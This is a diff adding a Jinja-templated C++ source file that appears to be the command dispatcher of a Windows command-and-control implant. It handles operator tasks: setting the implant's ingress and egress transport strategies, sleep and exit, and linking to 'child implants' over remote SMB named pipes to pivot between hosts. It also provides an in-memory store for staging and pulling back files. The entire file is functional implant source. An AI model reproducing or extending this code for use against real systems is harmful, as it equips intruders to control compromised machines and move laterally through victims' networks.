@@ -1,0 +1,481 @@
+[# commandtree.cpp.j2 — rendered at build time with module context #]
+#include "protocols/json/json.h"
+[# Module includes — conditional #]
+[% for module in enabled_modules %]
+#include "modules/[[module.module.name]]/[[module.module.name]].h"
+[% endfor %]
+#include "data/msgpack/msgpack.h"
+#include "settings.h"
+#include "data/structs.h"
+#include "systems/memstore.h"
+#include <windows.h>
+#include <string>
+#include "systems/childhandler.h"
+#include "comms/queues.h"
+#include "protocols/smb/smb.h"
+#include "_debug/debug.h"
+#include "defense/winapi.h"
+
+std::string GetErrorMessage(DWORD dwErrorCode) {
+    if (dwErrorCode == ERROR_SUCCESS) {
+        return "Success";
+    }
+
+    LPSTR messageBuffer = nullptr;
+
+    size_t size = WinApi::FormatMessageA(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER |
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        dwErrorCode,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPSTR)&messageBuffer,
+        0,
+        NULL
+    );
+
+    if (size == 0 || messageBuffer == nullptr) {
+        return "Unknown error code: " + std::to_string(dwErrorCode);
+    }
+
+    std::string message(messageBuffer, size);
+
+    WinApi::LocalFree(messageBuffer);
+
+    return message;
+}
+
+std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
+    DEBUG_LOG("[deref_memstore_content]: Dereferencing " << memstore_name_with_deref_symbol << " from memstore");
+
+    memstore_name_with_deref_symbol.erase(0, 1);
+
+    if (memstore_name_with_deref_symbol.empty()) {
+        DEBUG_LOG("[deref_memstore_content]: " << memstore_name_with_deref_symbol << " was empty");
+        return std::vector <uint8_t> {};
+    }
+
+    std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_name_with_deref_symbol);
+
+    return memstore_file_bytes;
+}
+
+std::vector<uint8_t> determine_if_argument_is_data_or_memstore_pointer(const nlohmann::json& element) {
+    if (element.is_binary()) {
+        return element.get_binary();
+    }
+
+    if (element.is_string()) {
+        std::string s = element.get<std::string>();
+
+        if (!s.empty() && s[0] == '*') {
+            return deref_memstore_content(s);
+        }
+    }
+    return {};
+}
+
+bool IsStrategyValid(const std::string& strategy, const std::string& setting_key) {
+    auto allowed = SettingsManager::instance().get<std::vector<std::string>>(setting_key, {});
+    for (const auto& s : allowed) {
+        if (s == strategy) return true;
+    }
+    return false;
+}
+
+nlohmann::json command_tree(nlohmann::json task_data) {
+    std::string task_name = task_data["task"]["task_name"];
+    if (task_name.empty()) {
+        nlohmann::json result;
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
+        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
+        return result;
+    }
+    DEBUG_LOG("[command_tree]: " << task_name);
+
+    // ════════════════════════════════════════════
+    // Core commands (always present)
+    // ════════════════════════════════════════════
+
+    if (task_name == "strat set get") {
+        nlohmann::json result;
+        std::string target_strat = task_data["task"]["args"]["strategy_name"];
+
+        if (IsStrategyValid(target_strat, "comms_get_strats")) {
+            SettingsManager::instance().set("comms_get_function", target_strat);
+            result["data"] = "Ingress strategy successfully updated to: " + target_strat;
+            result["windows_error_code"] = ERROR_SUCCESS;
+        }
+        else {
+            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["windows_error_code"] = ERROR_FILE_NOT_FOUND;
+        }
+
+        result["message"] = GetErrorMessage(result["windows_error_code"]);
+        return result;
+    }
+
+    else if (task_name == "strat set post") {
+        nlohmann::json result;
+        std::string target_strat = task_data["task"]["args"]["strategy_name"];
+
+        if (IsStrategyValid(target_strat, "comms_post_strats")) {
+            SettingsManager::instance().set("comms_post_function", target_strat);
+            result["data"] = "Egress strategy successfully updated to: " + target_strat;
+            result["windows_error_code"] = ERROR_SUCCESS;
+        }
+        else {
+            result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["windows_error_code"] = ERROR_FILE_NOT_FOUND;
+        }
+
+        result["message"] = GetErrorMessage(result["windows_error_code"]);
+        return result;
+    }
+
+    else if (task_name == "strat set both") {
+        nlohmann::json result;
+        std::string get_strat = task_data["task"]["args"]["get_strategy_name"];
+        std::string post_strat = task_data["task"]["args"]["post_strategy_name"];
+
+        bool get_valid = IsStrategyValid(get_strat, "comms_get_strats");
+        bool post_valid = IsStrategyValid(post_strat, "comms_post_strats");
+
+        if (get_valid && post_valid) {
+            SettingsManager::instance().set("comms_get_function", get_strat);
+            SettingsManager::instance().set("comms_post_function", post_strat);
+
+            result["data"] = "Symmetry updated. Ingress: " + get_strat + " | Egress: " + post_strat;
+            result["windows_error_code"] = ERROR_SUCCESS;
+        }
+        else {
+            result["data"] = "Error: Update failed. One or more strategies invalid.";
+            result["windows_error_code"] = ERROR_NOT_FOUND;
+        }
+
+        result["message"] = GetErrorMessage(result["windows_error_code"]);
+        return result;
+    }
+
+    else if (task_name == "strat list") {
+        nlohmann::json result;
+        std::string output = "--- Ingress (GET) ---\n";
+
+        auto get_list = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});
+        for (const auto& name : get_list) {
+            output += "  > " + name + "\n";
+        }
+
+        output += "\n--- Egress (POST) ---\n";
+        auto post_list = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});
+        for (const auto& name : post_list) {
+            output += "  > " + name + "\n";
+        }
+
+        result["data"] = output;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+
+        return result;
+    }
+    else if (task_name == "strat active") {
+        nlohmann::json result;
+
+        std::string get_strategy = SettingsManager::instance().get<std::string>("comms_get_function", "");
+        std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");
+
+        std::string output = "--- Active Transport Strategies ---\n";
+        output += "Ingress (GET)  : " + get_strategy + "\n";
+        output += "Egress (POST) : " + post_strategy + "\n";
+
+        result["data"] = output;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+
+        result["comms_get_strategy"] = get_strategy;
+        result["comms_post_strategy"] = post_strategy;
+
+        return result;
+    }
+
+    else if (task_name == "exit") {
+        exit(0);
+    }
+    else if (task_name == "sleep") {
+        nlohmann::json result;
+
+        int sleep_time = task_data["task"]["args"]["sleep_time"];
+
+        SettingsManager::instance().set("sleep_time", sleep_time);
+
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+
+        return result;
+    }
+
+    else if (task_name == "link smb") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("target") || !args["target"].is_string()) {
+            result["error"] = "Task failed: 'target' is missing or not a string";
+            return result;
+        }
+        if (!args.contains("protocol") || !args["protocol"].is_string()) {
+            result["error"] = "Task failed: 'protocol' is missing or not a string";
+            return result;
+        }
+        if (!args.contains("inbox_pipe") || !args["inbox_pipe"].is_string()) {
+            result["error"] = "Task failed: 'inbox_pipe' is missing or not a string";
+            return result;
+        }
+        if (!args.contains("outbox_pipe") || !args["outbox_pipe"].is_string()) {
+            result["error"] = "Task failed: 'outbox_pipe' is missing or not a string";
+            return result;
+        }
+
+        std::string protocol = args["protocol"];
+        if (protocol != "smb" && protocol != "pipe") {
+            result["error"] = "Task failed: Unknown protocol '" + protocol + "'.";
+            return result;
+        }
+
+        ChildRouteInfo cri;
+        cri.route_type = ROUTE_SMB_PIPE;
+
+        std::string target_host = args["target"];
+        std::string raw_inbox = "\\\\" + target_host + "\\pipe\\" + args["inbox_pipe"].get<std::string>();
+        std::string raw_outbox = "\\\\" + target_host + "\\pipe\\" + args["outbox_pipe"].get<std::string>();
+
+        cri.pipe_inbox = std::wstring(raw_inbox.begin(), raw_inbox.end());
+        cri.pipe_outbox = std::wstring(raw_outbox.begin(), raw_outbox.end());
+        cri.host_address = target_host;
+
+        DEBUG_LOG("Waiting for INBOX pipe to become available...");
+        if (!WinApi::WaitNamedPipeW(cri.pipe_inbox.c_str(), 5000)) {
+            result["error"] = "Timeout waiting for INBOX pipe. Child might be dead or busy.";
+            return result;
+        }
+        HANDLE h_parent_write = WinApi::CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (h_parent_write == INVALID_HANDLE_VALUE) {
+            result["error"] = "Failed to open INBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
+            return result;
+        }
+
+        DEBUG_LOG("INBOX connected. Waiting for OUTBOX pipe to become available...");
+        if (!WinApi::WaitNamedPipeW(cri.pipe_outbox.c_str(), 5000)) {
+            WinApi::CloseHandle(h_parent_write);
+            result["error"] = "Timeout waiting for OUTBOX pipe. Child dropped connection.";
+            return result;
+        }
+        HANDLE h_parent_read = WinApi::CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (h_parent_read == INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(h_parent_write);
+            result["error"] = "Failed to open OUTBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
+            return result;
+        }
+
+        DEBUG_LOG("Pipes connected. Waiting for child to check in...");
+        cri.h_pipe_inbox = h_parent_write;
+        cri.h_pipe_outbox = h_parent_read;
+
+        DWORD mode = PIPE_READMODE_MESSAGE;
+        if (!WinApi::SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
+            DEBUG_LOG("Failed to set pipe to message mode. Error: " << WinApi::GetLastError());
+        }
+
+        std::vector<uint8_t> request_bytes;
+        DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);
+
+        if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
+            DEBUG_LOG("Pipe broke or child disconnected. Error: " << read_status);
+            result["error"] = "Pipe broke or child disconnected";
+            return result;
+        }
+
+        try {
+            nlohmann::json child_request_array = nlohmann::json::from_msgpack(request_bytes);
+
+            if (!child_request_array.is_array() || child_request_array.empty()) {
+                result["error"] = "Child sent empty or invalid array format.";
+                return result;
+            }
+
+            nlohmann::json child_request = child_request_array[0];
+            std::string child_uuid = child_request["implant_uuid"];
+
+            cri.child_uuid = child_uuid;
+            ChildHandler::instance().add_child(child_uuid, cri);
+
+            for (const auto& item : child_request_array) {
+                GetQueue::push(item);
+            }
+
+            nlohmann::json task_list = nlohmann::json::array();
+            std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);
+
+            DWORD bytes_written = 0;
+            WinApi::WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
+        }
+        catch (const std::exception& e) {
+            DEBUG_LOG("Exception during link: " << e.what());
+            result["error"] = "Something went wrong linking to the implant";
+            return result;
+        }
+
+        result["data"]["child_uuid"] = cri.child_uuid;
+        result["message"] = "Successfully linked to child implant " + protocol + ".";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        return result;
+    }
+    else if (task_name == "unlink smb") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("child_uuid") || !args["child_uuid"].is_string()) {
+            result["error"] = "Task failed: 'child_uuid' is missing or not a string";
+            return result;
+        }
+
+        std::string child_uuid = task_data["task"]["args"]["child_uuid"];
+
+        ChildRouteInfo cri;
+
+        if (ChildHandler::instance().get_child(child_uuid, cri) == false) {
+            result["error"] = "Could not find child";
+            return result;
+        }
+
+        DEBUG_LOG("Unlinking child: " << child_uuid);
+
+        if (cri.h_pipe_inbox != INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(cri.h_pipe_inbox);
+        }
+        if (cri.h_pipe_outbox != INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(cri.h_pipe_outbox);
+        }
+
+        ChildHandler::instance().remove_child(child_uuid);
+
+        result["message"] = "Successfully unlinked and closed pipes for child " + child_uuid;
+        result["windows_error_code"] = 0;
+        return result;
+    }
+
+    else if (task_name == "link list"){
+        nlohmann::json result;
+        nlohmann::json child_info = ChildHandler::instance().get_all_children();
+        result["data"] = child_info;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        return result;
+    }
+
+    // Memstore commands
+    else if (task_name == "memstore upload") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
+            result["error"] = "Task failed: 'file_contents' is missing or not binary.";
+            return result;
+        }
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            result["error"] = "Task failed: 'file_name' is missing or not a string.";
+            return result;
+        }
+
+        std::string file_name = task_data["task"]["args"]["file_name"];
+
+        auto& json_element = task_data["task"]["args"]["file_contents"];
+        std::vector<uint8_t> file_bytes;
+        file_bytes = json_element.get_binary();
+
+        int windows_error_code = MemStore::instance().store(file_name, file_bytes);
+
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        return result;
+    }
+    else if (task_name == "memstore download") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            result["error"] = "file_name is missing";
+            return result;
+        }
+
+        std::string memstore_file_to_download = args["file_name"];
+        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
+
+        result["data"] = nlohmann::json::binary(memstore_file_bytes);
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        return result;
+    }
+    else if (task_name == "memstore delete") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            result["error"] = "Task failed: 'file_name' is missing or not string.";
+            return result;
+        }
+
+        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];
+
+        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        return result;
+    }
+    else if (task_name == "memstore clear") {
+        nlohmann::json result;
+
+        int windows_error_code = MemStore::instance().clear();
+
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        return result;
+    }
+    else if (task_name == "memstore list") {
+        nlohmann::json result;
+
+        std::vector<std::string> file_names = MemStore::instance().get_file_names();
+
+        std::string output;
+        for (const auto& file_name : file_names) {
+            output += file_name + "\n";
+        }
+
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        result["data"] = output;
+        return result;
+    }
+
+    // ════════════════════════════════════════════
+    // Module commands (conditionally included)
+    // ════════════════════════════════════════════
+[% for module in enabled_modules %]
+[% for cmd_name, cmd in module.commands.items() %]
+[[cmd.snippet]]
+[% endfor %]
+[% endfor %]
+
+    else {
+        nlohmann::json result;
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
+        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
+        return result;
+    }
+}
